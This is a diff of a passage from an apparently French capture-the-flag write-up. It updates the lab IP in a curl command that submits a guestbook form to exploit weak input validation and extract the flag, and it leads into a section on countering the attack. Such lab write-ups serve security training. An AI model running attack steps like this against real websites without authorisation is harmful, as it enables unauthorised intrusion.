@@ -13,7 +13,7 @@ Peut-être que la validation des entrées sur le serveur est liée à une expres
 Quoi qu'il en soit, le flag peut être récupéré via la commande suivante:
 
 ```bash
-curl -s -X POST "http://192.168.56.101/?page=feedback" --data "txtName=test&mtxtMessage=s&btnSign=Sign+Guestbook" | grep -oP 'The flag is : \K[0-9a-f]{64}' | head -1
+curl -s -X POST "http://192.168.56.102/?page=feedback" --data "txtName=test&mtxtMessage=s&btnSign=Sign+Guestbook" | grep -oP 'The flag is : \K[0-9a-f]{64}' | head -1
 ```
 
 ## Comment contrer cette attaque
